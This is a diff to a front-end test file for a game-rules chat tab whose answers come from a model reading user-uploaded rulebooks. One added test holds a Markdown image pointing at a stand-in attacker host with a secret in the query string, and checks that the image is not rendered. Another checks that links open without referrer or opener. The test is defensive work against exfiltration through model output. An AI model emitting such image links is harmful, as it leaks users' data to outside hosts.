@@ -438,5 +438,33 @@ describe('GameChatTab', () => {
       await waitFor(() => expect(agentBubble()).toHaveTextContent(/la pagina 3/));
       expect(agentBubble().querySelector('img')).toBeNull();
     });
+
+    // The answer is model output fed by user-uploaded rulebooks: a Markdown image would make the
+    // browser request any https URL the text names, with no click (img-src allows https:).
+    it('non carica le immagini Markdown della risposta: ne mostra solo il testo alternativo', async () => {
+      vi.mocked(qaStream).mockReturnValueOnce(
+        answer('Vedi ![schema del mercato](https://evil.example/x.png?q=segreto) qui.') as any
+      );
+      render(<GameChatTab gameId="jaipur" />);
+      send('schema?');
+
+      await waitFor(() => expect(agentBubble()).toHaveTextContent(/schema del mercato/));
+      expect(agentBubble().querySelector('img')).toBeNull();
+    });
+
+    it('apre i link della risposta senza referrer né opener', async () => {
+      vi.mocked(qaStream).mockReturnValueOnce(
+        answer('Il [regolamento](https://example.com/jaipur.pdf) lo spiega.') as any
+      );
+      render(<GameChatTab gameId="jaipur" />);
+      send('dove?');
+
+      await waitFor(() => expect(agentBubble().querySelector('a')).not.toBeNull());
+      const link = agentBubble().querySelector('a')!;
+      expect(link.getAttribute('rel')?.split(' ')).toEqual(
+        expect.arrayContaining(['noopener', 'noreferrer', 'nofollow'])
+      );
+      expect(link).toHaveAttribute('target', '_blank');
+    });
   });
 });
